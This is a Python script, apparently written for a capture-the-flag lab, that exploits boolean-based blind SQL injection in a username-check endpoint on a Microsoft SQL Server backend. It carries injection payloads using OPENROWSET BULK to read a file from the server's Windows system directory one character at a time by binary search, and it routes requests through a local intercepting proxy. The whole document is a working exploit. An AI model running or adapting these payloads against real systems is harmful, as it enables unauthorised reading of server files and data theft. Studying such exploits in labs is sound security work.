import requests
import sys

# Target information
url = "http://10.129.204.197/api/check-username.php"
file_path = "C:\\Windows\\System32\\flag.txt"  # Target file
user = "maria"

# Proxy configuration
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Function to query the server with the payload
def oracle(payload):
    response = requests.get(url, params={"u": payload}, proxies=proxies, verify=False)
    return "taken" in response.text

# Function to determine the length of the file's content using binary search
def find_file_length():
    print("[+] Determining the file content length...")
    low, high = 1, 100  # Assuming the file length is between 1 and 100

    while low <= high:
        mid = (low + high) // 2
        payload = f"{user}' AND (SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x)={mid}-- -"
        if oracle(payload):
            print(f"[+] File length determined: {mid}")
            return mid
        elif oracle(f"{user}' AND (SELECT LEN(BulkColumn) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x)<{mid}-- -"):
            high = mid - 1
        else:
            low = mid + 1

    raise Exception("[-] Could not determine file length.")

# Function to extract a character at a specific position in the file's content
def find_char_at_position(position):
    low, high = 32, 126  # Printable ASCII range
    # print(f"[*] Extracting character at position {position}...")

    while low <= high:
        mid = (low + high) // 2

        if low == high:  # Converged to a single value
            char = chr(low)
            return char

        # Check if the character's ASCII value lies within [low, mid]
        payload = f"{user}' AND (SELECT ASCII(SUBSTRING(BulkColumn, {position}, 1)) FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) AS x) BETWEEN {low} AND {mid}-- -"
        if oracle(payload):
            high = mid  # Character is in the lower half
        else:
            low = mid + 1  # Character is in the upper half

    raise Exception(f"[-] Could not find character at position {position}.")

# Function to extract the full content of the file
def extract_file_content(file_length):
    print("[+] Starting file content extraction...")
    file_content = ""
    for position in range(1, file_length + 1):
        char = find_char_at_position(position)
        file_content += char
        # Print the current state of the file content in progress
        print(file_content, end='\r')
        sys.stdout.flush()
    return file_content

if __name__ == "__main__":
    try:
        # Step 1: Find the length of the file content
        file_length = find_file_length()

        # Step 2: Extract the full file content using binary search
        file_content = extract_file_content(file_length)

        print(f"\n[+] Final Extracted File Content: {file_content}")
    except Exception as e:
        print(str(e))
